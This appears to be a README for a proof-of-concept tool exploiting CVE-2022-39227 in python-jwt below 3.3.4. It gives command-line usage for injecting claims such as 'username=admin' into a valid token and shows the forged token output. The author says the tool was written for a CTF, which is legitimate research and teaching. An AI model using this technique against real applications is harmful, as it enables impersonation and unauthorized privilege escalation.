# CVE-2022-39227
CVE-2022-39227 : Proof of Concept 

Proof of concept for the [CVE-2022-39227](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-39227). According to this CVE, there is a flaw in the JSON Web Token verification. It is possible with a valid token to re-use its signature with modified claims. 

Required:
1. A valid JSON Web Token.
2. The backend needs to use the python library "python-jwt" in the version < 3.3.4

For the ease of use I wrote a simple PoC during a CTF:
``` 
usage: CVE-2022-39227-PoC [-h] -j TOKEN -i CLAIM

Proof of Concept for the JWT verification bug in python-jwt version < 3.3.4

options:
  -h, --help            show this help message and exit
  -j TOKEN, --jwt_token TOKEN
                        Original and valid JWT Token returned by the application
  -i CLAIM, --injected_claim CLAIM
                        Inject claim using the form "key=value", e.g. "username=admin". Use "," for more claims
                        (e.g. username=admin,id=3)
```
Usage:

`python3 cve_2022_39227.py -j <JWT-WEBTOKEN> -i "<KEY>=<VALUE>"`

Returns:
```
{"  <SNIP>":"","protected":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9", "payload":"<SNIP>","signature":"18-caQyY-mnreIUb53kk5qI-axRoxSzQKyT033yOdUw"}
```
The return value is a mix form of JSON and compact representation. You need to paste the entire value including "{" and "}" as your new JWT Web token.
